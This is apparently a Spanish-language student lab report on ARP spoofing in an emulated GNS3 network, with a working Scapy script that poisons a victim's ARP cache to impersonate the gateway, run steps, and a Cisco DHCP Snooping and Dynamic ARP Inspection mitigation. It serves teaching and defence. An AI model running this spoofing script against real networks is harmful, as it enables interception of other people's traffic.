

# 🛡️Security Audit: ARP Spoofing & Man-in-the-Middle (MitM)

---
<p align="center">
  <img src="https://img.shields.io/badge/Platform-GNS3-blue?style=for-the-badge&logo=virtualbox&logoColor=white" alt="GNS3 Platform">
  <img src="https://img.shields.io/badge/Language-Python%203-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python 3">
  <img src="https://img.shields.io/badge/Library-Scapy-red?style=for-the-badge&logo=scapy&logoColor=white" alt="Scapy">
  <img src="https://img.shields.io/badge/Status-Mitigated-success?style=for-the-badge" alt="Status Mitigated">
</p>

## 📝 Información del Estudiante

* **Institución:** Instituto Tecnológico de Las Américas (ITLA)
* **Asignatura:** Seguridad de Redes
* **Auditor Técnico:** Zoe Daniela Bobonagua Acevedo
* **Matrícula:** 2025-0839
* **Evidencia Audiovisual:** [▶️ Video aqui](https://youtu.be/xgdvPNo7Io8?si=5iZoUgI-qLBcmxc-)

---

## 🎯 1. Objetivo del Laboratorio

El propósito fundamental de esta auditoría es evaluar la confianza implícita del protocolo de resolución de direcciones (**ARP**) dentro de una red de área local. La práctica demuestra cómo un nodo no autorizado puede interceptar y desviar el flujo de datos bidireccional entre una estación de trabajo (VPCS) y su puerta de enlace predeterminada (Gateway), validando posteriormente los mecanismos de control perimetral avanzados como **DHCP Snooping** y **Dynamic ARP Inspection (DAI)** en conmutadores Cisco.

---

## 📐 2. Arquitectura de la Red Emulada

La infraestructura física y lógica fue replicada en **GNS3** operando bajo el segmento IP corporativo `10.25.83.0/24`.

### Diagrama de Flujo Lógico

```text
                      +-----------------------+
                      |    R1 (Cisco IOSv)    |
                      |   Gateway & DHCP Srv  |
                      +-----------------------+
                                  | f0/0
                                  |
                                  | Gi0/1
                      +-----------------------+
                      |  SW1 (Cisco IOSv-L2)  |
                      |   Core / STP Root     |
                      +-----------------------+
                                  | Gi0/2
                                  |
                                  | Gi0/2
                      +-----------------------+
                      |  SW2 (Cisco IOSv-L2)  |
                      |     Access Switch     |
                      +-----------------------+
                         | Gi0/3           | Gi1/0
                         |                 |
                         | e0              | e0
          +--------------------+     +--------------------+
          |    kali-1 (VM)     |     |     PC1 (VPCS)     |
          |  Auditor Estático  |     |   Cliente Dinámico |
          +--------------------+     +--------------------+

```

### Cuadro de Direccionamiento e Interfaces

| Dispositivo | Interfaz Física | Tipo de Enlace | Dirección IP | Máscara de Red | Default Gateway | Segmento VLAN |
| --- | --- | --- | --- | --- | --- | --- |
| **R1** | f0/0.83 | Subinterfaz | 10.25.83.1 | 255.255.255.0 | N/A | VLAN 83 (Data) |
| **R1** | f0/0.99 | Subinterfaz | 10.25.99.1 | 255.255.255.0 | N/A | VLAN 99 (Nativa) |
| **SW1** | Vlan99 | Virtual SVI | 10.25.99.11 | 255.255.255.0 | 10.25.99.1 | VLAN 99 (Gestión) |
| **SW2** | Vlan99 | Virtual SVI | 10.25.99.12 | 255.255.255.0 | 10.25.99.1 | VLAN 99 (Gestión) |
| **kali-1** | eth0 | Acceso Estático | 10.25.83.99 | 255.255.255.0 | 10.25.83.1 | VLAN 83 (Data) |
| **PC1** | e0 | Acceso Dinámico | 10.25.83.11 | 255.255.255.0 | 10.25.83.1 | VLAN 83 (Data) |

---

## 💻 3. Documentación Técnica del Script (`arp_mitm.py`)

### Análisis Operativo del Código

El script implementa una técnica de envenenamiento basada en solicitudes ARP directas (*ARP Request Routing*). Inicialmente, el script envía un paquete de descubrimiento en difusión (broadcast) para mapear y capturar la dirección MAC real de la víctima (`PC1`). Una vez obtenida, entra en un bucle infinito inyectando tramas unicast personalizadas cada segundo. El paquete fraudulento vincula la dirección IP del Gateway (`10.25.83.1`) con la dirección MAC física de la máquina de auditoría (Kali Linux), corrompiendo la tabla ARP local de la víctima sin alertar al resto de la red.

### Código de la Herramienta

```python
#!/usr/bin/env python3
from scapy.all import *
import time
import sys

interface = "eth0"
victim_ip = "10.25.83.11"   # IP de tu nodo VPCS
gateway_ip = "10.25.83.1"   # IP del Router que vas a suplantar

print(f"[*] Iniciando ataque ARP optimizado para nodos VPCS...")

try:
    # 1. Obtener la MAC de la VPCS para enviarle el paquete directo
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip), timeout=2, iface=interface, verbose=False)
    victim_mac = None
    for _, rcv in ans:
        victim_mac = rcv[Ether].src

    if not victim_mac:
        print("[-] No se pudo obtener la MAC de la VPCS. Verifica que tenga IP fija configurada.")
        sys.exit(1)

    mi_mac = get_if_hwaddr(interface)
    print(f"[+] VPCS detectada en MAC: {victim_mac}")
    print("[*] Enviando ráfaga ARP Request. Revisa tu VPCS...")

    while True:
        # op=1 significa "ARP Request" (Petición). 
        # hwsrc es tu MAC de Kali, pero psrc es la IP del Router.
        packet = Ether(dst=victim_mac, src=mi_mac) / ARP(op=1, hwsrc=mi_mac, psrc=gateway_ip, pdst=victim_ip)
        
        sendp(packet, iface=interface, verbose=False)
        time.sleep(1)

except KeyboardInterrupt:
    print("\n[-] Ataque detenido.")
    sys.exit(0)

```

---

## 🚀 4. Guía de Ejecución y Diagnóstico de Anomalías

### Paso 1: Comprobar el Estado Original (Línea Base Segura)

Antes de iniciar la prueba, verifique la tabla de resolución de direcciones desde la consola de la VPCS (**PC1**). El mapeo de la IP del router debe mostrar su dirección física real:

```text
PC1> show arp

```

### Paso 2: Ejecución del Script de Auditoría

Ejecute la herramienta desde la terminal de Kali Linux asegurando los privilegios de superusuario (`sudo`) necesarios para interactuar con la capa de enlace de datos:

```bash
chmod +x arp_mitm.py
sudo ./arp_mitm.py

```

### Paso 3: Evidencia de la Corrupción de Tabla (Poisoning)

Regrese inmediatamente a la consola de **PC1** y repita el comando de diagnóstico. Comprobará que la dirección IP del Gateway ahora apunta erróneamente hacia la dirección MAC de Kali Linux:

```text
PC1> show arp

```

---

## 🛠️ 5. Plan de Mitigación e Ingeniería de Hardening

> [!IMPORTANT]
> La mitigación contra la suplantación ARP requiere construir una base de datos de confianza estricta basada en el emparejamiento IP-MAC verificado por DHCP. No se puede configurar DAI de forma aislada sin antes activar DHCP Snooping.

### Configuración Defensiva (Copiar y pegar en SW2)

Para inmunizar la infraestructura de accesos contra ataques de envenenamiento ARP, aplique la siguiente plantilla de directivas en el conmutador **SW2**:

```text
configure terminal
!
! 1. Activar y configurar DHCP Snooping en la VLAN de datos
ip dhcp snooping
ip dhcp snooping vlan 83
no ip dhcp snooping information option
!
! 2. Declarar el enlace troncal hacia el Core/Router como puerto de confianza
interface GigabitEthernet0/2
 ip dhcp snooping trust
 ip arp inspection trust
exit
!
! 3. Habilitar la Inspección Dinámica de ARP (DAI) globalmente para la VLAN
ip arp inspection vlan 83
end

```

### Comprobación de la Eficiencia de la Defensa

Si vuelve a intentar ejecutar el script de Scapy desde Kali Linux con la mitigación activa, el switch **SW2** interceptará las solicitudes ARP anómalas, las contrastará contra la base de datos de enlaces de DHCP Snooping (*DHCP Snooping Binding Database*) y, al notar que la IP del Router no corresponde con la MAC del puerto `Gi0/3`, descartará las tramas automáticamente emitiendo alertas syslog en consola:

```text
%SW_DAI-4-DHCP_SNOOPING_DENY: 1 packets denied by DAI on Gi0/3

```

La tabla ARP de la estación **PC1** permanecerá intacta, asegurando la continuidad e integridad de las comunicaciones.

---

## ⚖️ 6. Aviso de Uso Académico

Este proyecto ha sido desarrollado exclusivamente bajo un entorno académico controlado dentro de los laboratorios del **ITLA** para la materia **Seguridad de Redes**. Queda estrictamente prohibido el uso de estas técnicas en redes de producción o infraestructuras externas sin los debidos permisos explícitos de los administradores de sistemas.
